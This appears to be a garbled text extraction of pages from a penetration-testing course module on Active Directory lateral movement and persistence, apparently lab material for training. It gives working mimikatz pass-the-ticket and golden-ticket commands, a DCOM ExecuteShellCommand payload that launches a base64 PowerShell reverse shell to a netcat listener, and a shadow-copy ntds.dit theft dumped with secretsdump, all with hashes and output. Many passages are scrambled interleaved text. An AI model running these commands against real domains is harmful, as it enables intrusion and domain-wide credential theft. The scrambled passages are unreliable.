+     Directory: C:\Tools
+
+Mode                 LastWriteTime                                             Length Name
+                                                                               ------ ----
+----                 -------------
+                                                                                  1561 <cr>[0;12bd0]-0-0-40810000-dave@cifs-
+-a----          9/14/2022 6:24 AM
+                                                                                  1505 [0;12bd0]-2-0-40c10000-dave@krbtgt-
+web04.kirbi</cr>
+                                                                                  1561 [0;1c6860]-0-0-40810000-dave@cifs-
+-a----          9/14/2022 6:24 AM
+                                                                                  1505 [0;1c6860]-2-0-40c10000-dave@krbtgt-
+CORP.COM.kirbi
+                                                                                  1561 [0;1c7bcc]-0-0-40810000-dave@cifs-
+-a----          9/14/2022 6:24 AM
+
+web04.kirbi
+
+-a----          9/14/2022 6:24 AM
+
+CORP.COM.kirbi
+
+-a----          9/14/2022 6:24 AM
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                    836
+                                                                                                                                                                                                   Penetration Testing with Kali Linux
+
+web04.kirbi
+
+-a----       9/14/2022  6:24 AM       1505 [0;1c7bcc]-2-0-40c10000-dave@krbtgt-
+                        6:24 AM       1561 [0;1c933d]-0-0-40810000-dave@cifs-
+CORP.COM.kirbi          6:24 AM       1505 [0;1c933d]-2-0-40c10000-dave@krbtgt-
+                        6:24 AM       1561 [0;1ca6c2]-0-0-40810000-dave@cifs-
+-a----       9/14/2022  6:24 AM       1505 [0;1ca6c2]-2-0-40c10000-dave@krbtgt-
+
+web04.kirbi
+
+-a----       9/14/2022
+
+CORP.COM.kirbi
+
+-a----       9/14/2022
+
+web04.kirbi
+
+-a----       9/14/2022
+
+CORP.COM.kirbi
+
+...
+
+                        Listing 901 - Exporting Kerberos TGT/TGS to disk
+
+As many tickets have been generated, we can just pick any TGS ticket in the dave@cifs-
+web04.kirbi format and inject it through mimikatz via the kerberos::ptt command.
+
+mimikatz # <cu>kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi</cu>
+
+* File: '[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi': OK
+                                       Listing 902 - Injecting the selected TGS into process memory.
+
+No errors have been thrown, meaning that we should expect the ticket in our session when
+running klist.
+
+PS C:\Tools> <cu>klist</cu>
+
+Current LogonId is 0:0x13bca7
+
+Cached  Tickets:  <(<c1crr)>>cdiafvse/w@ebC0O4R<P/.cCrO>M<@/cCrO>RP.COMWhitlow
+#0>
+         Client:
+         Server:
+        TKSietracbrktTeitTciFkmeleat:gEs9n/0cx1r4y4/p0t2801io02n2005T0:yp3-e1>::3f2AoErS(wJla-eor2fcd5faa6rlb-e)lCyeTSr-eHnMeAwCa-bSlHeA1n-a9m6e_canonicalize
+        KCRSEeandedsccnhseewCTiiaolnmTFlelim:Keagdee::ys:T99//y01p2e41/:/L22is00At22EiOnS22Sg--9512505:5737:36-513-I21:Cn1:1Ts9p13S0e3-c(Hti(lMnloAgcoCtac-helaSl)Hin)Aje1c-te9d6ticket in memory
+
+We notice that the dave ticket has been successfully imported in our own session for the jen user.
+
+Let's confirm we have been granted access to the restricted shared folder.
+
+PS C:\Tools> <cu>ls \\web04\backup</cu>
+
+     Directory: \\web04\backup
+
+Mode                   LastWriteTime  Length Name
+----                   -------------  ------ ----
+-a----       9/13/2022 2:52 AM
+                                               0 backup_schemata.txt
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                           837
+                                                                          Penetration Testing with Kali Linux
+
+Listing 904 - Accessing the shared folder through the injected ticket
+
+Awesome! We managed to successfully access the folder by impersonating dave's identity after
+injecting its authentication token into our user's process.
+
+24.1.6 DCOM
+
+In this section, we will inspect a fairly recent lateral movement technique that exploits the
+Distributed Component Object Model (DCOM) and learn how it can be abused for lateral
+movement.
+
+The Microsoft Component Object Model (COM) is a system for creating software components
+that interact with each other. While COM was created for either same-process or cross-process
+interaction, it was extended to Distributed Component Object Model (DCOM) for interaction
+between multiple computers over a network.
+
+Both COM and DCOM are very old technologies dating back to the very first editions of Windows.
+Interaction with DCOM is performed over RPC on TCP port 135 and local administrator access is
+required to call the DCOM Service Control Manager, which is essentially an API.
+
+Cybereason documented a collection of various DCOM lateral movement techniques, including
+one discovered by Matt Nelson, which we are covering in this section.
+
+The discovered DCOM lateral movement technique is based on the Microsoft Management
+Console (MMC) COM application that is employed for scripted automation of Windows systems.
+
+The MMC Application     meCxeleathcsoustdioaunllnoodwfesrantthyheesDhceorlcel uacmtoiomennmWt.hAoaifcnttldiAvoiewpfVptilheicewataipourntohpeOenrbttijyce.acAttses,diwtusshenicrahmis eeaxusptuohgsogereizstehtdse,,
+ExecuteShellCommand
+this method allows the
+
+wWheicahreisgthoeindgetfoaudltefmorolnosctaral taedmthiinsislatrtaetroarlsm.Jeofvfermeyent attack as the jen user logged in from the
+$aFsdplrroceemocamidfyya=inncgoemtlhepevraotatmergdiseePtdIoPwWoeifnrSFdhIoLewEllsSOS0p1-4r15o7amC7sL5ptI2tEh1,Ne9w0Tsee7c4cohanondsatin.rsgtuamnteiantteofathreemGoettTeypMeMFrCom2P.0roagpIDplmicaetthioond.by
+
+[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<c
+
+r>192.168.50.73</cr>"))
+
+                        Listing 905 - Remotely Instantiating the MMC Application object
+
+Once the application object is saved into the $dcom variable, we can pass the required argument
+to the application via the ExecuteShellCommand method. The method accepts four parameters:
+Command, Directory, Parameters, and WindowState. We're only interested in the first and third
+parameters, which will be populated with cmd and /c calc, respectively.
+
+$dcom.Document.ActiveView.ExecuteShellCommand("<cr>cmd</cr>",$null,"<cr>/c
+calc</cr>","7")
+
+                                     Listing 906 - Executing a command on the remote DCOM object
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                 838
+                                                                          Penetration Testing with Kali Linux
+
+Once we execute these two PowerShell lines from CLIENT74, we should have spawned an
+instance of the calculator app.
+
+Because it's within Session 0, we can verify the calculator app is running with tasklist and filtering
+out the output with findstr on FILES04.
+
+C:\Users\Administrator><cu>tasklist | findstr "calc"</cu>
+
+win32calc.exe               4764 Services                                 0      12,132 K
+
+               Listing 907 - Verifying that calculator is running on FILES04
+
+We can now improve our craft by extending this attack to a full reverse shell like what we did in
+the WMI and WinRM section earlier in this Module.
+
+Having generated the base64 encoded reverse shell with our Python script, we can replace our
+DCOM payload with it.
+
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w
+hidden -e
+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF
+MAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
+AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
+
+                                  Listing 908 - Adding a reverse-shell as a DCOM payload on CLIENT74
+
+Switching to our Kali machine, we can verify any incoming connections on the listener that we
+simultaneously set up.
+
+kali@kali:~$ <cu>nc -lnvp 443</cu>
+
+listening on [any] 443 ...
+
+connect to [192.168.118.2] from (UNKNOWN)  [192.W1hi6t8l.o5w0.73]         50778
+
+PS C:\Windows\system32> <cu>whoami</cu>
+corp\jen
+
+aEFPSIpxLcpCEeliS:lcl\0eaW4ntiiton! ndW.owes\gsayisnteeLdmis3tai2n>gf9o<0oc9tuh->OOohSblod-tas5it7noi7nnn5ag2maa1en9r<e0/vaecJrduse>def-ifsthiroeenlyl athlroiungtherDnCaOlMblaotxerabl my oavebmusenint g the DCOM MMC
+In this Learning Unit, we learned the theory behind several lateral movement attacks and how to
+
+execute them from compromised clients.
+
+Next, we'll discover how to maintain access on the target network through persistence
+techniques.
+
+24.2 Active Directory persistence
+
+This Learning Unit covers the following Learning Objectives:
+· Understand the General Purpose of Persistence Techniques
+· Leverage Golden Tickets as a Persistence Attack
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                   839
+                                                                          Penetration Testing with Kali Linux
+
+· Learn about Shadow Copies and How They Can be Abused for Persistence
+
+Once an adversary has obtained access to a single or multiple hosts, they would like to maintain
+access as long as possible. This means that the attacker's access to the target network has to
+carry on after a reboot or even a credential change. MITRE defines the persistence tactic as a set
+of techniques aimed at maintaining an attacker's foothold on the target network.
+
+We can use traditional persistence methods in an Active Directory environment, but we can also
+gain AD-specific persistence as well.
+
+Note that in many real-world penetration tests or red-team engagements, persistence is
+not part of the scope due to the risk of incomplete removal once the assessment is
+complete.
+
+In the next Learning Unit, we are going to explore how golden ticket and shadow copy techniques
+can be misused to retain access.
+
+24.2.1 Golden ticket
+
+Returning to the explanation of Kerberos authentication, we'll recall that when a user submits a
+request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the
+domain. This secret key is the password hash of a domain user account called krbtgt.
+
+If we can get our hands on the krbtgt password hash, we could create our own self-made custom
+
+ATpASeGitllttvrhaTmeocsruik,siaTgsnlhiisgcookntAehktutinosstohaatweceinmncctehiacsntsasoiqtgituofohoenledr'sgeeMennnottaiadircmeukTldeeeGot,sSrmGe. soatielicdnmke'senbtrleeTtJssoiecofktuahfercrectceseeySsspi,WlsravohesivartiwdlsTeeopiw'clealkcseimeftiecoosrsneheeorprvtotihlcwyae.et, rGfwuoel ldaeetntnaccoTkuicnvkteeecrttesodrg. iivnWehthuilees
+
+For example, we could   cpdrroeomatetaecintaOscSTtoo-Gn5leT7tnr7os5klt2lare1btr9itn0wggtilplthatrasutssawt iontrobdneh-cpaarsuivhsieleesgitbeiedscucaosuersrreeicstthlayemyengecrmarynbpteturendol.fimthiteeDdomain
+Admins group, and the
+
+     We must carefully
+
+domain access. Consider explicitly obtaining the client's permission before executing
+
+this technique.
+
+This provides a neat way of keeping persistence in an Active Directory environment, but the best
+advantage is that the krbtgt account password is not automatically changed.
+
+This password is only changed when the domain functional level is upgraded from a pre-2008
+Windows server, but not from a newer version. Because of this, it is not uncommon to find very
+old krbtgt password hashes.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                840
+                                                                          Penetration Testing with Kali Linux
+
+     The Domain Functional Level dictates the capabilities of the domain and determines
+     which Windows operating systems can be run on the domain controller. Higher
+     functional levels enable additional features, functionality, and security mitigations.
+
+To test this persistence technique, we will first attempt to laterally move from the Windows 11
+CLIENT74 workstation to the domain controller via PsExec as the jen user by spawning a
+traditional command shell with the cmd command. This should fail because we do not have the
+proper permissions.
+
+C:\Tools\SysinternalsSuite><cu>PsExec64.exe \\DC1 cmd.exe</cu>
+
+PsExec v2.4 - Execute processes remotely
+Copyright (C) 2001-2022 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+Couldn't access DC1:
+<cr>Access is denied.</cr>
+
+                                          Listing 910 - Failed attempt to perform lateral movement
+
+Perfect, just as expected.
+
+At this stage of the engagement, the golden ticket will require us to have access to a Domain
+Admin's group account or to have compromised the domain controller itself to work as a
+persistence method.
+
+WaTcoicthsoiutmhniuts.lakTtinehdetnhoifswa, ecwcewe'lsillsllo,rwugneincMatoinmetihxketartazdcotfmrtohameinpCacs:o\snTwtorooorllWsldeh,irhatawlnsoidhtwhoisrfsetumheeotktehrbedtgelstsaakdctoucpmoupun:s:tlisnwagitchthoMemimmjefiafkanaddtmz.ains
+RdmmDPioIriisDmimmpaivilkkiiaan:layette:gzz0d0eb#0C#0O'e2<<R0lo10Pccwuuf'4/>>: Olp(rKs<ica5drv0i>0um)Sl-ep:g1e:-l:5s:-da2e1Ob/-Spu1-ag95<t877c/75hc32u<71/>09c20u7>0J-e6f5f8r9e0y5905-1781884369</cr>
+
+User : Administrator
+LM :
+NTLM : 2892d26cdf84d7a70e2eb3b9f05c425e
+
+RID : 000001f5 (501)
+User : Guest
+LM :
+NTLM :
+
+RID : 000001f6 (502)
+User : <cr>krbtgt</cr>
+LM :
+NTLM : <cr>1693c6cefafffc7af11ef34d1c788f47</cr>
+...
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  841
+                                                                                           Penetration Testing with Kali Linux
+
+                     Listing 911 - Dumping the krbtgt password hash using Mimikatz
+
+Having obtained the NTLM hash of the krbtgt account, along with the domain SID, we can now
+forge and inject our golden ticket.
+
+Creating the golden ticket and injecting it into memory does not require any administrative
+privileges and can even be performed from a computer that is not joined to the domain.
+
+We'll take the hash and continue the procedure from a compromised workstation.
+
+Let's move back to CLIENT74 as the jen user. Before we generate the golden ticket let's launch
+mimikatz and delete any existing Kerberos tickets with kerberos::purge.
+
+mimikatz # <cu>kerberos::purge</cu>
+Ticket(s) purge for current session is OK
+
+                                                 Listing 912 - Purging existing Kerberos Tickets
+
+Now, we'll supply the domain SID (which we can gather with whoami /user) to the Mimikatz
+kerberos::golden command to create the golden ticket.
+
+This time, we'll use the /krbtgt option instead of /rc4 to indicate we are supplying the password
+hash of the krbtgt user account. Starting July 2022, Microsoft improved the authentication
+process, so we'll need to provide an existing account. Let's set the golden ticket's username to
+jen. Before it didn't matter if the account existed.
+
+mimikatz # <cu>kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-
+
+658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt</cu>
+
+User     :   Scj<-eco1rrn-p>55.-0c20o1<m-/1(c9Cr8>O7R3P7)0270-658905905-17818W8hi4t3l6o9w
+Domain   :
+SID      :
+User Id  :
+
+Groups Id :  9*1<*c6/g19>36P*a/c256s01cse232fTh5ae21f2f:Tf15i5c2:c70ak5e7f51t11A*M8ef*53;149d9/<1/c13c7Jg8/e82>f0ff43r27ey2-:1r5c:45_7hmAaMc_;nt9/13/2032  2:15:57  AM
+ServiceKey:
+Lifetime :                   OS-57752190
+-> Ticket :
+
+*  PAC generated  generated
+*  PAC signed     encrypted
+*  EncTicketPart
+*  EncTicketPart
+
+* KrbCred generated
+
+<cr>Golden ticket for 'jen @ corp.com' successfully submitted for current session</cr>
+
+mimikatz # <cu>misc::cmd</cu>
+Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF665F1B800
+
+                                             Listing 913 - Creating a golden ticket using Mimikatz
+
+Mimikatz provides two sets of default values when using the golden ticket option: the user ID and
+the groups ID. The user ID is set to 500 by default, which is the RID of the built-in administrator for
+the domain. The values for the groups ID consist of the most privileged groups in Active Directory,
+including the Domain Admins group.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                842
+                                                                                 Penetration Testing with Kali Linux
+
+With the golden ticket injected into memory, let's use _PsExec__ to launch a new command
+prompt with misc::cmd.
+
+C:\Tools\SysinternalsSuite><cu>PsExec.exe \\dc1 cmd.exe</cu>
+
+PsExec v2.4 - Execute processes remotely
+Copyright (C) 2001-2022 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+C:\Windows\system32><cu>ipconfig</cu>
+Windows IP Configuration
+
+Ethernet adapter Ethernet0:
+
+     Connection-specific DNS Suffix . :
+     Link-local IPv6 Address . . . . . : fe80::5cd4:aacd:705a:3289%14
+     IPv4 Address. . . . . . . . . . . : 192.168.50.70
+     Subnet Mask . . . . . . . . . . . : 255.255.255.0
+     Default Gateway . . . . . . . . . : 192.168.50.254
+C:\Windows\system32><cu>whoami</cu>
+corp\jen
+
+                                                   Listing 914 - Using PsExec to access DC01
+
+Great! We now have an interactive command prompt on the domain controller. Now let's use the
+whoami command to verify that our user jen is now part of the Domain Admin group.
+
+C:\Windows\system32><cu>whoami /groups</cu>  Whitlow
+
+GROUP INFORMATION
+-----------------
+GE=M==AB=Ua=vrt===nIo=te=Lru==rdpai==Ty=b=t=Io===NuoN=n\=etra==A=mye==d=s==emg===i===rn=o==i===us===pt===,r===a=E==t===no==a=r=b==sl=====e====d===b===y======O==d=S==e=-==f=5=a==77=u==5===l2===t1===,9===0=E===n==J=a==e===bf===lf=e==rd==eA=T=Wylyg=e=i==plra=e=ols=u=-p==k==n==o==w==n====g==r==o==u==p=SS=SI=--D11--15--302-544
+
+Mandatory group, Enabled by default, Enabled group, Group owner
+
+BUILTIN\Users                                Alias                               S-1-5-32-545
+
+Mandatory group, Enabled by default, Enabled group
+
+BUILTIN\Pre-Windows 2000 Compatible Access Alias                                 S-1-5-32-554
+
+Mandatory group, Enabled by default, Enabled group
+
+NT AUTHORITY\NETWORK                         Well-known group S-1-5-2
+
+Mandatory group, Enabled by default, Enabled group
+
+NT AUTHORITY\Authenticated Users             Well-known group S-1-5-11
+
+Mandatory group, Enabled by default, Enabled group
+
+NT AUTHORITY\This Organization               Well-known group S-1-5-15
+
+Mandatory group, Enabled by default, Enabled group
+
+<cr>CORP\Domain Admins</cr>                                               Group               S-1-5-21-
+
+1987370270-658905905-1781884369-512 Mandatory group, Enabled by default, Enabled group
+
+CORP\Group Policy Creator Owners             Group                               S-1-5-21-1987370270-
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                                                                             843
+                                                                          Penetration Testing with Kali Linux
+
+658905905-1781884369-520 Mandatory group, Enabled by default, Enabled group
+
+CORP\Schema Admins                        Group                           S-1-5-21-1987370270-
+
+658905905-1781884369-518 Mandatory group, Enabled by default, Enabled group
+
+CORP\Enterprise Admins                    Group                           S-1-5-21-1987370270-
+
+658905905-1781884369-519 Mandatory group, Enabled by default, Enabled group
+
+CORP\Denied RODC Password Replication Group Alias                         S-1-5-21-1987370270-
+
+658905905-1781884369-572 Mandatory group, Enabled by default, Enabled group, Local
+
+Group
+
+Mandatory Label\High Mandatory Level      Label                           S-1-16-12288
+
+       Listing 915 - Performing lateral movement and persistence using the golden ticket and PsExec
+
+Perfect! Listing group memberships shows that we are now a member of multiple powerful
+groups including the Domain Admins group. Excellent.
+
+Note that by creating our own TGT and then using PsExec, we are performing the overpass the
+hash attack by leveraging Kerberos authentication as we discussed earlier in this Module.
+
+If we were to connect PsExec to the IP address of the domain controller instead of the hostname,
+we would instead force the use of NTLM authentication and access would still be blocked. This is
+illustrated in the listing below.
+
+C:\Tools\SysinternalsSuite> <cu>psexec.exe \\192.168.50.70 cmd.exe</cu>
+
+PsExec v2.4 - Execute processes remotely
+Copyright (C) 2001-2022 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+Couldn't access 192.168.50.70:
+
+eBeI<ncxnyrittsoih>rtebAiisnctAgacsDieenlsocidnswtoigo-mipntshr,aievwidnileNe.engThieLeadMdv.ea<hcd/Lacecissormthiu>nongontf9.s1tTt6hrhe-aiUtskesredablotltofghNwteTusLgJsMeoueflsradf,uretwtoehneyeontictWbcicahtkaainettiiotnilsntosiebnwuclcoehconkndsisoqopmuuiercaauaicnocs-euasasds mpleegirnsitisiismttreaanttiecveeacmTcGeeTcsshsattnooisatmhney.
+
+t2Ah4aSt.h2aa.ldl2oowwsCthoepySc,rhaelaastodiooknnwoofwcsnonapapsOiseSVh-s5oo7ltus7m5o2ef19fSi0lehsadoorwenSteirrevivcoelu(mVSeSs). is a Microsoft backup technology
+
+To manage volume shadow copies, the Microsoft signed binary vshadow.exe is offered as part of
+the Windows SDK.
+
+As domain admins, we can abuse the vshadow utility to create a Shadow Copy that will allow us
+to extract the Active Directory Database NTDS.dit database file. Once we've obtained a copy of
+the database, we need the SYSTEM hive, and then we can extract every user credential offline on
+our local Kali machine.
+
+To start, we'll connect as the jeffadmin domain admin user to the DC1 domain controller. Here we
+will launch an elevated command prompt and run the vshadow utility with -nw options to disable
+writers, which speeds up backup creation and include the -p option to store the copy on disk.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                             844
+                                                                                                                                               Penetration Testing with Kali Linux
+
+C:\Tools><cu>vshadow.exe -nw -p C:</cu>
+
+VSHADOW.EXE 3.0 - Volume Shadow Copy sample client.
+Copyright (C) 2005 Microsoft Corporation. All rights reserved.
+
+(Option: No-writers option detected)
+(Option: Create shadow copy set)
+- Setting the VSS context to: 0x00000010
+Creating shadow set {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5} ...
+- Adding volume \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\] to the shadow
+set...
+Creating the shadow (DoSnapshotSet) ...
+(Waiting for the asynchronous operation to finish...)
+Shadow copy set successfully created.
+
+List of created shadow copies:
+
+Querying all shadow copies with the SnapshotSetID {f7f6d8dd-a555-477b-8be6-
+c9bd2eafb0c5} ...
+
+* SNAPSHOT ID = {c37217ab-e1c4-4245-9dfe-c81078180ae5} ...
+
+- Shadow copy Set: {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5}
+
+- Original count of shadow copies = 1
+
+- Original Volume name: \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\]
+
+- Creation Time: 9/19/2022 4:31:51 AM
+
+- Shadow copy device name: <cr>\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2</cr>
+
+- Originating machine: DC1.corp.com
+
+-  SNPAetortrtovvriiEicxdbpeueortemsaiesc:dd:hinA{bue:t5o9_D4CR6e11.3le7cao-rs7peb.9cNfoo-m_4W9r2i5t-earfs80D-i5f1faebWrdhie6tn0ltboi2wa0ld5}
+-                                    Jeffrey
+-
+-
+
+Snapshot creation done.
+
+Once the  snapshot  has  bLeisetinngta9O1kS7e--5nP7se7ru5f2ocr1cm9e0isngsfauSllhya,dwowe  Copy of the entire C: drive                          shadow  copy  device
+name.
+                                                                                          should take note of the
+
+We'll now copy the whole AD Database from the shadow copy to the C: drive root folder by
+
+specifying the shadow copy device name and adding the full ntds.dit path.
+
+C:\Tools><cu>copy
+\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit
+c:\ntds.dit.bak</cu>
+
+     1 file(s) copied.
+
+                                            Listing 918 - Copying the ntds database to the C: drive
+
+As a last ingredient, to correctly extract the content of ntds.dit, we need to save the SYSTEM hive
+from the Windows registry. We can accomplish this with the reg utility and the save argument.
+
+C:\><cu>reg.exe save hklm\system c:\system.bak</cu>
+The operation completed successfully.
+
+                                            Listing 919 - Copying the ntds database to the C: drive
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                     845
+                                                                                                                              Penetration Testing with Kali Linux
+
+Once the two .bak files are moved to our Kali machine, we can continue extracting the credential
+materials with the secretsdump tool from the impacket suite. We'll supply the ntds database with
+the -ntds parameter and the system hive with the -system parameter. Then we will tell impact to
+parse the files locally by adding the LOCAL keyword.
+
+kali@kali:~$ <cu>impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL</cu>
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Target system bootKey: 0xbbe6040ef887565e9adb216561dc0620
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 98d2b28135d3e0d113c4fa9d965ac533
+[*] Reading and decrypting hashes from ntds.dit.bak
+<cr>Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425
+e:::</cr>
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC1$:1000:aad3b435b51404eeaad3b435b51404ee:eda4af1186051537c77fa4f53ce2fe1a:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
+dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
+stephanie:1104:aad3b435b51404eeaad3b435b51404ee:d2b35e8ac9d8f4ad5200acc4e0fd44fa:::
+jeff:1105:aad3b435b51404eeaad3b435b51404ee:2688c6d2af5e9c7ddb268899123744ea:::
+jeffadmin:1106:aad3b435b51404eeaad3b435b51404ee:e460605a9dbd55097c6cf77af2f89a03:::
+iis_service:1109:aad3b435b51404eeaad3b435b51404ee:4d28cf5252d39971419580a51484ca09:::
+WEB04$:1112:aad3b435b51404eeaad3b435b51404ee:87db4a6147afa7bdb46d1ab2478ffe9e:::
+FILES04$:1118:aad3b435b51404eeaad3b435b51404ee:d75ffc4baaeb9ed40f7aa12d1f57f6f4:::
+CLIENT74$:1121:aad3b435b51404eeaad3b435b51404ee:5eca857673356d26a98e2466a0fb1c65:::
+CLIENT75$:1122:aad3b435b51404eeaad3b435b51404ee:b57715dcb5b529f212a9a4effd03aaf6:::
+pete:1123:aad3b435b51404eeaad3b435b51404ee:369def79d8372408bf6e93364cc93075:::
+jen:1124:aad3b435b51404eeaad3b435b51404ee:369def79d8372408bf6e93364cc93075:::
+
+AACD9A[*dLCd6d:1]mmImE5$iiiKn:n6NniieTi1a7ess3sr6bsttt6rre2$rfa5:daartot16t5-1boosoc2rrrbt::9:dksea5:ad-ea1yeehassss2-m2bd1ca5f323bc8rb66c---7o4cc-sm30tth5cmassnb5d1t85--51d1h-h:4sfmmf0.faadd94cc78ie--9e1tssd4.ahhcba4aa3daa1185k3--05b9e436e83:95838J8bd9e955af0184f49era0be741yeb3ef6W8:2hi6f4t0f2lf9cod31w4b1c164d42834bbbba0bfde424e2dcba8065c197d7cb0e20500961f90349e:::
+D9k9DkC6rr6C:b:b11$eftt$ggb1::dactt2:e2:eca5esas-ee5d1c9es2sb8125cc-9526c-e868--mt3fccdse7-t5t42h:ss93m-f-83hha73cmmcf7aa-a8afscc0fbh45a--ac52ss1eeehh453aa-376911293--6O6d39:S49c66-a76:854178c7736ccf5e35023ecd1caf19f63200ba4081b6ac6f86518938391978021fd0ead254689359f9c5351945045f01baac1012e92416ebdccac3fcb389f67c1a1c96ca9e3df42cc
+
+krbtgt:des-cbc-md5:683bdcba9e7c5de9
+...
+[*] Cleaning up...
+
+                                            Listing 920 - Copying the ntds database to the C: drive
+
+Great! We managed to obtain NTLM hashes and Kerberos keys for every AD user. We can now try
+to crack them or use as-is in pass-the-hash attacks.
+
+While these methods might work fine, they leave an access trail and may require us to upload
+tools. An alternative is to abuse AD functionality itself to capture hashes remotely from a
+workstation.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  846
+                                                                          Penetration Testing with Kali Linux
+
+To do this, we could move laterally to the domain controller and run Mimikatz to dump the
+password hash of every user, using the DC sync method described in the previous Module. This is
+a less conspicuous persistence technique that we can misuse.
+
+Although most penetration tests wouldn't require us to be covert, we should always
+evaluate a given technique's stealthiness, which could be useful during future red-
+teaming engagements.
+
+In this Learning Unit, we explored a few Windows Active Directory persistence techniques that
+could be employed during penetration testing or red-teaming exercises whose rules of
+engagement mandate we retain long-term access to the compromised environment.
+
+24.3 Wrapping up
+
+This Module concludes Active Directory concepts by providing an overview of several Active
+Directory lateral movement and persistence techniques. While many techniques have been
+mentioned and explained here, there are many others worth exploring and others yet to be
+discovered.
+
+The effectiveness of the techniques we learned is strictly related to the security posture of the
+environment we are testing. Although AD security has been greatly improved over the years, its
+attack surface it's ultimately dependent on the complexity of its design and interoperability with
+legacy systems that might impose lower security standards.
+
+As we focused   on how to     execute these   treecdh-tneiaqmueWinshg,itwelxeoewarclsisoesdebluibtegraetneelyrailglynnooret donstpeeanltehtirnaetisosn.
+The concept of  stealth is a  requirement on
+testing ones.
+
+Nevertheless,  omneasstteerpintgowAacrtdivbeecDoimrecintgoraynJeeenxfupfmreereiyernactieodn,peanuethtreanttioicnattieosnt,era. nd  lateral  movement
+techniques is
+
+                              OS-57752190
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                    847
+
